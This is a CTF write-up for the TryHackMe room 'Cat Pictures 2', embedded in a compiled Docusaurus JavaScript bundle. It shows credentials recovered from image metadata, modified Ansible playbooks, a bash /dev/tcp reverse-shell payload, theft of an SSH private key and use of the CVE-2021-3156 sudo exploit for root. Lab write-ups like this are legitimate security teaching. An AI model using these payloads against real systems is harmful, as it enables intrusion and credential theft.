"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[988],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>g});var a=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,i=function(e,t){if(null==e)return{};var n,a,i={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var o=a.createContext({}),c=function(e){var t=a.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(o.Provider,{value:t},e.children)},u="mdxType",h={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,i=e.mdxType,r=e.originalType,o=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),u=c(n),m=i,g=u["".concat(o,".").concat(m)]||u[m]||h[m]||r;return n?a.createElement(g,l(l({ref:t},p),{},{components:n})):a.createElement(g,l({ref:t},p))}));function g(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var r=n.length,l=new Array(r);l[0]=m;var s={};for(var o in t)hasOwnProperty.call(t,o)&&(s[o]=t[o]);s.originalType=e,s[u]="string"==typeof e?e:i,l[1]=s;for(var c=2;c<r;c++)l[c]=n[c];return a.createElement.apply(null,l)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},1521:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>l,default:()=>g,frontMatter:()=>r,metadata:()=>s,toc:()=>c});var a=n(7462),i=(n(7294),n(3905));const r={},l="Cat Pictures 2",s={unversionedId:"writeups/thm/challenges/cat-pictures-2",id:"writeups/thm/challenges/cat-pictures-2",title:"Cat Pictures 2",description:"This is a writeup for the TryHackMe room Cat Pictures 2.",source:"@site/docs/writeups/thm/challenges/cat-pictures-2.md",sourceDirName:"writeups/thm/challenges",slug:"/writeups/thm/challenges/cat-pictures-2",permalink:"/docs/writeups/thm/challenges/cat-pictures-2",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/thm/challenges/cat-pictures-2.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"Soccer",permalink:"/docs/writeups/htb/soccer"},next:{title:"Devie",permalink:"/docs/writeups/thm/challenges/devie"}},o={},c=[{value:"Footprinting",id:"footprinting",level:2},{value:"First flag",id:"first-flag",level:2},{value:"Finding interesting metadata",id:"finding-interesting-metadata",level:3},{value:"The secret note",id:"the-secret-note",level:3},{value:"Accessing Gitea",id:"accessing-gitea",level:3},{value:"Second flag",id:"second-flag",level:2},{value:"Running Ansible tasks using OliveTin",id:"running-ansible-tasks-using-olivetin",level:3},{value:"Editing the playbook",id:"editing-the-playbook",level:3},{value:"Third flag",id:"third-flag",level:2},{value:"Obtaining a reverse shell",id:"obtaining-a-reverse-shell",level:3},{value:"Stealing ssh keys",id:"stealing-ssh-keys",level:3},{value:"Exploiting CVE-2021-3156",id:"exploiting-cve-2021-3156",level:3}],p=(u="Image",function(e){return console.warn("Component "+u+" was not imported, exported, or provided by MDXProvider as global scope"),(0,i.kt)("div",e)});var u;const h={toc:c},m="wrapper";function g(e){let{components:t,...n}=e;return(0,i.kt)(m,(0,a.Z)({},h,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"cat-pictures-2"},"Cat Pictures 2"),(0,i.kt)("p",null,"This is a writeup for the TryHackMe room ",(0,i.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/catpictures2"},"Cat Pictures 2"),"."),(0,i.kt)(p,{src:"https://tryhackme-images.s3.amazonaws.com/room-icons/4c424fa649d64938ae8282b14e4299ac.png",width:"128",mdxType:"Image"}),(0,i.kt)("p",null,"Main parts of the room:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Reading image metadata"),(0,i.kt)("li",{parentName:"ul"},"Accessing Gitea and editing files using Git or in-browser editor"),(0,i.kt)("li",{parentName:"ul"},"Runnig custom Ansible tasks through OliveTin"),(0,i.kt)("li",{parentName:"ul"},"Exploiting CVE-2021-3156")),(0,i.kt)("h2",{id:"footprinting"},"Footprinting"),(0,i.kt)("p",null,"Firstly, we can start with a nmap scan."),(0,i.kt)("p",null,"We find five open ports and three web servers publicly accessible."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"nmap -sS <HOST>\n")),(0,i.kt)(p,{src:"/images/writeups/thm/challenges/cat-pictures-2/nmap.png",mdxType:"Image"}),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"22 -> SSH\n80 -> Lychee Photo Album\n222 -> Gitea SSH (?)\n3000 -> Gitea\n8080 -> python server (?)\n")),(0,i.kt)("h2",{id:"first-flag"},"First flag"),(0,i.kt)("h3",{id:"finding-interesting-metadata"},"Finding interesting metadata"),(0,i.kt)("p",null,"We can start by looking inside the Lychee Photo Album."),(0,i.kt)("p",null,"In the info of the first image we can find a message about stripping away the metadata."),(0,i.kt)(p,{src:"/images/writeups/thm/challenges/cat-pictures-2/image.png",mdxType:"Image"}),(0,i.kt)("p",null,"Once the image is downloaded, we can check its metadata to find an url to a secret txt note."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"exiftool image.jpg\n")),(0,i.kt)(p,{src:"/images/writeups/thm/challenges/cat-pictures-2/metadata.png",mdxType:"Image"}),(0,i.kt)("h3",{id:"the-secret-note"},"The secret note"),(0,i.kt)("p",null,"The url is ",(0,i.kt)("inlineCode",{parentName:"p"},":8080/764efa883dda1e11db47671c4a3bbd9e.txt")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"note to self:\n\nI setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.\nThis file isn't easy to find anyway unless you have the correct url...\n\ngitea: port 3000\nuser: samarium\npassword: TUmhyZ37CLZrhP\n\nansible runner (olivetin): port 1337\n")),(0,i.kt)("h3",{id:"accessing-gitea"},"Accessing Gitea"),(0,i.kt)("p",null,"Now, we have the credentials for the gitea instance."),(0,i.kt)("p",null,"Once logged in, we can see a repository called ",(0,i.kt)("inlineCode",{parentName:"p"},"ansible"),"."),(0,i.kt)(p,{src:"/images/writeups/thm/challenges/cat-pictures-2/repo.png",mdxType:"Image"}),(0,i.kt)("p",null,"Inside the repository there is a file called ",(0,i.kt)("inlineCode",{parentName:"p"},"flag1.txt"),". Open it to get the first flag."),(0,i.kt)("h2",{id:"second-flag"},"Second flag"),(0,i.kt)("h3",{id:"running-ansible-tasks-using-olivetin"},"Running Ansible tasks using OliveTin"),(0,i.kt)("p",null,"From the secret note, we know that Ansible is accessible on the port 1337."),(0,i.kt)("p",null,"There we can find a OliveTin instance that allows to run the Ansible tasks."),(0,i.kt)(p,{src:"/images/writeups/thm/challenges/cat-pictures-2/ansible.png",mdxType:"Image"}),(0,i.kt)("h3",{id:"editing-the-playbook"},"Editing the playbook"),(0,i.kt)("p",null,"It is possible to change the script ",(0,i.kt)("inlineCode",{parentName:"p"},"playbook.yml")," through Gitea and then run it from OliveTin."),(0,i.kt)(p,{src:"/images/writeups/thm/challenges/cat-pictures-2/edit.png",mdxType:"Image"}),(0,i.kt)("p",null,"Firstly, we can print the content of the home folder."),(0,i.kt)("p",null,"Following the example script, this is a possible solution."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-yaml"},"---\n- name: Test\n  hosts: all\n  remote_user: bismuth\n  tasks:\n    - name: print home folder\n      become: false\n      command: ls -lR ~\n      register: ls_content\n      changed_when: false\n\n    - debug: var=ls_content\n")),(0,i.kt)("p",null,"Run the script and check the output."),(0,i.kt)("p",null,"We can see that in the home folder there is a file called ",(0,i.kt)("inlineCode",{parentName:"p"},"flag2.txt"),"."),(0,i.kt)("p",null,"We can edit again the script to print the content of the flag."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-yaml"},"---\n- name: Test\n  hosts: all\n  remote_user: bismuth\n  tasks:\n    - name: print flag2\n      become: false\n      command: cat flag2.txt\n      register: flag2\n      changed_when: false\n\n    - debug: var=flag2\n")),(0,i.kt)(p,{src:"/images/writeups/thm/challenges/cat-pictures-2/ansible-output.png",mdxType:"Image"}),(0,i.kt)("p",null,"If you check the output, you can see the second flag."),(0,i.kt)("h2",{id:"third-flag"},"Third flag"),(0,i.kt)("h3",{id:"obtaining-a-reverse-shell"},"Obtaining a reverse shell"),(0,i.kt)("p",null,"For the third flag, it is better to use a reverse shell."),(0,i.kt)("p",null,"At this link you can find an example:"),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"https://gist.github.com/Reelix/32ccf1baaa3066654a460265fca53960"},"https://gist.github.com/Reelix/32ccf1baaa3066654a460265fca53960")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-yaml"},"---\n- name: Test\n  hosts: all\n  remote_user: bismuth\n  tasks:\n    - name: rev\n      shell: bash -c 'bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1'\n")),(0,i.kt)(p,{src:"/images/writeups/thm/challenges/cat-pictures-2/rev.png",mdxType:"Image"}),(0,i.kt)("h3",{id:"stealing-ssh-keys"},"Stealing ssh keys"),(0,i.kt)("p",null,"To make the work easier, we can also steal the ssh key."),(0,i.kt)("p",null,"It is enough to copy the content of ",(0,i.kt)("inlineCode",{parentName:"p"},"~/.ssh/id_rsa")," and paste it in a file on our machine."),(0,i.kt)("p",null,"Then, we can use the command ",(0,i.kt)("inlineCode",{parentName:"p"},"ssh -i <FILE> bismuth@<HOST>")," to login."),(0,i.kt)("h3",{id:"exploiting-cve-2021-3156"},"Exploiting CVE-2021-3156"),(0,i.kt)("p",null,"We can try with LinPeas and LinEnum, but a faster way is to exploit the CVE-2021-3156 vulnerability."),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"https://github.com/blasty/CVE-2021-3156"},"https://github.com/blasty/CVE-2021-3156")),(0,i.kt)("p",null,"Download the file from the github repo and copy them on the machine."),(0,i.kt)("p",null,"After that, follow the instructions to exploit the vulnerability."),(0,i.kt)("p",null,"In the end, you should run something like this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"# build the exploit\nmake\n\n# obtain a list of possible targets\n./sudo-hax-me-a-sandwich\n\n# select a target\n./sudo-hax-me-a-sandwich 0\n")),(0,i.kt)("p",null,"The third flag is in the root folder."),(0,i.kt)(p,{src:"/images/writeups/thm/challenges/cat-pictures-2/pe.png",mdxType:"Image"}))}g.isMDXComponent=!0}}]);